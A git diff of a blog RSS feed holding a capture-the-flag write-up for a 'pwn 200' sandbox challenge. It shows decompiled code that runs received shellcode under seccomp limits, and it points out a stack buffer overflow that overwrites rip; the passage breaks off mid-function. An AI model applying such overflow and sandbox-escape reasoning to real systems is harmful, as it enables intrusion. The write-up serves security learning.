@@ -5,8 +5,8 @@
     <description>i'm korean pwner. :P</description>
     <link>http://naver.com/</link>
     <atom:link href="http://naver.com/atom.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 06 Feb 2016 08:54:36 -0800</pubDate>
-    <lastBuildDate>Sat, 06 Feb 2016 08:54:36 -0800</lastBuildDate>
+    <pubDate>Sat, 06 Feb 2016 08:59:49 -0800</pubDate>
+    <lastBuildDate>Sat, 06 Feb 2016 08:59:49 -0800</lastBuildDate>
     <generator>Jekyll v2.5.3</generator>
     
       <item>
@@ -19,103 +19,54 @@ at frist, pwn 200 seem very easy:) . analyzing it, i think that this is sandbox.
 &lt;p&gt;this binary conserve with process using pipe. parent process could not exploit because it is sandbox that only use syscall(exit, read, write).
 &lt;br&gt;&lt;/p&gt;
 
-&lt;div class='bogus-wrapper'&gt;&lt;notextile&gt;&lt;figure class='code'&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre class=&quot;line-numbers&quot;&gt;&lt;span class='line-number'&gt;1&lt;/span&gt;
-&lt;span class='line-number'&gt;2&lt;/span&gt;
-&lt;span class='line-number'&gt;3&lt;/span&gt;
-&lt;span class='line-number'&gt;4&lt;/span&gt;
-&lt;span class='line-number'&gt;5&lt;/span&gt;
-&lt;span class='line-number'&gt;6&lt;/span&gt;
-&lt;span class='line-number'&gt;7&lt;/span&gt;
-&lt;span class='line-number'&gt;8&lt;/span&gt;
-&lt;span class='line-number'&gt;9&lt;/span&gt;
-&lt;span class='line-number'&gt;10&lt;/span&gt;
-&lt;span class='line-number'&gt;11&lt;/span&gt;
-&lt;span class='line-number'&gt;12&lt;/span&gt;
-&lt;span class='line-number'&gt;13&lt;/span&gt;
-&lt;span class='line-number'&gt;14&lt;/span&gt;
-&lt;span class='line-number'&gt;15&lt;/span&gt;
-&lt;span class='line-number'&gt;16&lt;/span&gt;
-&lt;span class='line-number'&gt;17&lt;/span&gt;
-&lt;span class='line-number'&gt;18&lt;/span&gt;
-&lt;span class='line-number'&gt;19&lt;/span&gt;
-&lt;span class='line-number'&gt;20&lt;/span&gt;
-&lt;span class='line-number'&gt;21&lt;/span&gt;
-&lt;span class='line-number'&gt;22&lt;/span&gt;
-&lt;span class='line-number'&gt;23&lt;/span&gt;
-&lt;span class='line-number'&gt;24&lt;/span&gt;
-&lt;span class='line-number'&gt;25&lt;/span&gt;
-&lt;span class='line-number'&gt;26&lt;/span&gt;
-&lt;span class='line-number'&gt;27&lt;/span&gt;
-&lt;span class='line-number'&gt;28&lt;/span&gt;
-&lt;span class='line-number'&gt;29&lt;/span&gt;
-&lt;span class='line-number'&gt;30&lt;/span&gt;
-&lt;span class='line-number'&gt;31&lt;/span&gt;
-&lt;span class='line-number'&gt;32&lt;/span&gt;
-&lt;span class='line-number'&gt;33&lt;/span&gt;
-&lt;span class='line-number'&gt;34&lt;/span&gt;
-&lt;span class='line-number'&gt;35&lt;/span&gt;
-&lt;span class='line-number'&gt;36&lt;/span&gt;
-&lt;span class='line-number'&gt;37&lt;/span&gt;
-&lt;span class='line-number'&gt;38&lt;/span&gt;
-&lt;span class='line-number'&gt;39&lt;/span&gt;
-&lt;span class='line-number'&gt;40&lt;/span&gt;
-&lt;span class='line-number'&gt;41&lt;/span&gt;
-&lt;span class='line-number'&gt;42&lt;/span&gt;
-&lt;span class='line-number'&gt;43&lt;/span&gt;
-&lt;span class='line-number'&gt;44&lt;/span&gt;
-&lt;span class='line-number'&gt;45&lt;/span&gt;
-&lt;span class='line-number'&gt;46&lt;/span&gt;
-&lt;span class='line-number'&gt;47&lt;/span&gt;
-&lt;span class='line-number'&gt;48&lt;/span&gt;
-&lt;/pre&gt;&lt;/td&gt;&lt;td class='code'&gt;&lt;pre&gt;&lt;code class=''&gt;&lt;span class='line'&gt;  if ( read(0, &amp;buf, 4uLL) &amp;gt; 0 )
-&lt;/span&gt;&lt;span class='line'&gt;  {
-&lt;/span&gt;&lt;span class='line'&gt;    v3 = (char *)buf;
-&lt;/span&gt;&lt;span class='line'&gt;    v11 = (char *)mmap(0LL, buf, 7, 34, -1, 0LL);
-&lt;/span&gt;&lt;span class='line'&gt;    if ( !v11 )
-&lt;/span&gt;&lt;span class='line'&gt;      __assert_fail(&quot;psc != ((void *)0)&quot;, &quot;sandman.c&quot;, 0xCAu, &quot;main&quot;);
-&lt;/span&gt;&lt;span class='line'&gt;    v13 = 0;
-&lt;/span&gt;&lt;span class='line'&gt;    while ( buf )
-&lt;/span&gt;&lt;span class='line'&gt;    {
-&lt;/span&gt;&lt;span class='line'&gt;      v3 = &amp;v11[v13];
-&lt;/span&gt;&lt;span class='line'&gt;      v12 = read(0, v3, buf);
-&lt;/span&gt;&lt;span class='line'&gt;      if ( v12 &amp;lt; 0 )
-&lt;/span&gt;&lt;span class='line'&gt;        break;
-&lt;/span&gt;&lt;span class='line'&gt;      v13 += v12;
-&lt;/span&gt;&lt;span class='line'&gt;      buf -= v12;
-&lt;/span&gt;&lt;span class='line'&gt;    }
-&lt;/span&gt;&lt;span class='line'&gt;    if ( !buf )
-&lt;/span&gt;&lt;span class='line'&gt;    {
-&lt;/span&gt;&lt;span class='line'&gt;      LODWORD(v4) = seccomp_init(0LL, v3);
-&lt;/span&gt;&lt;span class='line'&gt;      v10 = v4;
-&lt;/span&gt;&lt;span class='line'&gt;      if ( v4 )
-&lt;/span&gt;&lt;span class='line'&gt;      {
-&lt;/span&gt;&lt;span class='line'&gt;        v12 = seccomp_rule_add(v10, 2147418112LL, 0LL, 0LL);
-&lt;/span&gt;&lt;span class='line'&gt;        if ( v12 &amp;gt;= 0 )
-&lt;/span&gt;&lt;span class='line'&gt;        {
-&lt;/span&gt;&lt;span class='line'&gt;          v12 = seccomp_rule_add(v10, 2147418112LL, 1LL, 0LL);
-&lt;/span&gt;&lt;span class='line'&gt;          if ( v12 &amp;gt;= 0 )
-&lt;/span&gt;&lt;span class='line'&gt;          {
-&lt;/span&gt;&lt;span class='line'&gt;            v12 = seccomp_rule_add(v10, 2147418112LL, 60LL, 0LL);
-&lt;/span&gt;&lt;span class='line'&gt;            if ( v12 &amp;gt;= 0 )
-&lt;/span&gt;&lt;span class='line'&gt;            {
-&lt;/span&gt;&lt;span class='line'&gt;              v12 = seccomp_rule_add(v10, 2147418112LL, 231LL, 0LL);
-&lt;/span&gt;&lt;span class='line'&gt;              if ( v12 &amp;gt;= 0 )
-&lt;/span&gt;&lt;span class='line'&gt;              {
-&lt;/span&gt;&lt;span class='line'&gt;                v5 = v10;
-&lt;/span&gt;&lt;span class='line'&gt;                v12 = seccomp_load(v10);
-&lt;/span&gt;&lt;span class='line'&gt;                if ( v12 &amp;gt;= 0 )
-&lt;/span&gt;&lt;span class='line'&gt;                {
-&lt;/span&gt;&lt;span class='line'&gt;                  v9 = v11;
-&lt;/span&gt;&lt;span class='line'&gt;                  ((void (__fastcall *)(__int64, signed __int64))v11)(v5, 2147418112LL);
-&lt;/span&gt;&lt;span class='line'&gt;                }
-&lt;/span&gt;&lt;span class='line'&gt;              }
-&lt;/span&gt;&lt;span class='line'&gt;            }
-&lt;/span&gt;&lt;span class='line'&gt;          }
-&lt;/span&gt;&lt;span class='line'&gt;        }
-&lt;/span&gt;&lt;span class='line'&gt;      }
-&lt;/span&gt;&lt;span class='line'&gt;    }
-&lt;/span&gt;&lt;span class='line'&gt;  }
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;&lt;/notextile&gt;&lt;/div&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;__assert_fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;psc != ((void *)0)&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;sandman.c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xCAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;main&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;LODWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seccomp_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seccomp_rule_add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2147418112LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seccomp_rule_add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2147418112LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seccomp_rule_add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2147418112LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seccomp_rule_add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2147418112LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;231LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seccomp_load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                  &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2147418112LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;br&gt;
@@ -135,92 +86,49 @@ and then, i analyze child function. there are some inputs in child function.&lt;
 
 &lt;p&gt;after input, heap buffer(3rd input) is copied dest buffer(rbp-0x220).yet, heap buffer is possible 0x1000. it overwrite rip !!!! :)&lt;br&gt;&lt;/p&gt;
 
-&lt;div class='bogus-wrapper'&gt;&lt;notextile&gt;&lt;figure class='code'&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre class=&quot;line-numbers&quot;&gt;&lt;span class='line-number'&gt;1&lt;/span&gt;
-&lt;span class='line-number'&gt;2&lt;/span&gt;
-&lt;span class='line-number'&gt;3&lt;/span&gt;
-&lt;span class='line-number'&gt;4&lt;/span&gt;
-&lt;span class='line-number'&gt;5&lt;/span&gt;
-&lt;span class='line-number'&gt;6&lt;/span&gt;
-&lt;span class='line-number'&gt;7&lt;/span&gt;
-&lt;span class='line-number'&gt;8&lt;/span&gt;
-&lt;span class='line-number'&gt;9&lt;/span&gt;
-&lt;span class='line-number'&gt;10&lt;/span&gt;
-&lt;span class='line-number'&gt;11&lt;/span&gt;
-&lt;span class='line-number'&gt;12&lt;/span&gt;
-&lt;span class='line-number'&gt;13&lt;/span&gt;
-&lt;span class='line-number'&gt;14&lt;/span&gt;
-&lt;span class='line-number'&gt;15&lt;/span&gt;
-&lt;span class='line-number'&gt;16&lt;/span&gt;
-&lt;span class='line-number'&gt;17&lt;/span&gt;
-&lt;span class='line-number'&gt;18&lt;/span&gt;
-&lt;span class='line-number'&gt;19&lt;/span&gt;
-&lt;span class='line-number'&gt;20&lt;/span&gt;
-&lt;span class='line-number'&gt;21&lt;/span&gt;
-&lt;span class='line-number'&gt;22&lt;/span&gt;
-&lt;span class='line-number'&gt;23&lt;/span&gt;
-&lt;span class='line-number'&gt;24&lt;/span&gt;
-&lt;span class='line-number'&gt;25&lt;/span&gt;
-&lt;span class='line-number'&gt;26&lt;/span&gt;
-&lt;span class='line-number'&gt;27&lt;/span&gt;
-&lt;span class='line-number'&gt;28&lt;/span&gt;
-&lt;span class='line-number'&gt;29&lt;/span&gt;
-&lt;span class='line-number'&gt;30&lt;/span&gt;
-&lt;span class='line-number'&gt;31&lt;/span&gt;
-&lt;span class='line-number'&gt;32&lt;/span&gt;
-&lt;span class='line-number'&gt;33&lt;/span&gt;
-&lt;span class='line-number'&gt;34&lt;/span&gt;
-&lt;span class='line-number'&gt;35&lt;/span&gt;
-&lt;span class='line-number'&gt;36&lt;/span&gt;
-&lt;span class='line-number'&gt;37&lt;/span&gt;
-&lt;span class='line-number'&gt;38&lt;/span&gt;
-&lt;span class='line-number'&gt;39&lt;/span&gt;
-&lt;span class='line-number'&gt;40&lt;/span&gt;
-&lt;span class='line-number'&gt;41&lt;/span&gt;
-&lt;span class='line-number'&gt;42&lt;/span&gt;
-&lt;span class='line-number'&gt;43&lt;/span&gt;
-&lt;/pre&gt;&lt;/td&gt;&lt;td class='code'&gt;&lt;pre&gt;&lt;code class=''&gt;&lt;span class='line'&gt;int __fastcall sub_400BAC(__int64 a1)
-&lt;/span&gt;&lt;span class='line'&gt;{
-&lt;/span&gt;&lt;span class='line'&gt;  int result; // eax@1
-&lt;/span&gt;&lt;span class='line'&gt;  char *v2; // rax@4
-&lt;/span&gt;&lt;span class='line'&gt;  char *v3; // rax@6
-&lt;/span&gt;&lt;span class='line'&gt;  size_t v4; // rax@9
-&lt;/span&gt;&lt;span class='line'&gt;  char dest; // [sp+10h] [bp-220h]@9
-&lt;/span&gt;&lt;span class='line'&gt;  size_t v6; // [sp+210h] [bp-20h]@2
-&lt;/span&gt;&lt;span class='line'&gt;  char *nptr; // [sp+218h] [bp-18h]@2
-&lt;/span&gt;&lt;span class='line'&gt;  char *v8; // [sp+220h] [bp-10h]@1
-&lt;/span&gt;&lt;span class='line'&gt;  unsigned __int16 v9; // [sp+22Eh] [bp-2h]@1
-&lt;/span&gt;&lt;span class='line'&gt;
-&lt;/span&gt;&lt;span class='line'&gt;  v9 = 80;
-&lt;/span&gt;&lt;span class='line'&gt;  v8 = (char *)&amp;unk_401194;
-&lt;/span&gt;&lt;span class='line'&gt;  result = strncmp((const char *)a1, &quot;http://&quot;, 7uLL);
-&lt;/span&gt;&lt;span class='line'&gt;  if ( !result )
-&lt;/span&gt;&lt;span class='line'&gt;  {
-&lt;/span&gt;&lt;span class='line'&gt;    nptr = (char *)(a1 + 7);
-&lt;/span&gt;&lt;span class='line'&gt;    v6 = a1 + strlen((const char *)a1);
-&lt;/span&gt;&lt;span class='line'&gt;    while ( (unsigned __int64)nptr &amp;gt; v6 )
-&lt;/span&gt;&lt;span class='line'&gt;    {
-&lt;/span&gt;&lt;span class='line'&gt;      if ( *nptr == 0x3A )
-&lt;/span&gt;&lt;span class='line'&gt;      {
-&lt;/span&gt;&lt;span class='line'&gt;        v2 = nptr++;
-&lt;/span&gt;&lt;span class='line'&gt;        *v2 = 0;
-&lt;/span&gt;&lt;span class='line'&gt;        v9 = atoi(nptr);
-&lt;/span&gt;&lt;span class='line'&gt;      }
-&lt;/span&gt;&lt;span class='line'&gt;      else if ( *nptr == 0x2F )
-&lt;/span&gt;&lt;span class='line'&gt;      {
-&lt;/span&gt;&lt;span class='line'&gt;        v3 = nptr++;
-&lt;/span&gt;&lt;span class='line'&gt;        *v3 = 0;
-&lt;/span&gt;&lt;span class='line'&gt;        v8 = nptr;
-&lt;/span&gt;&lt;span class='line'&gt;        break;
-&lt;/span&gt;&lt;span class='line'&gt;      }
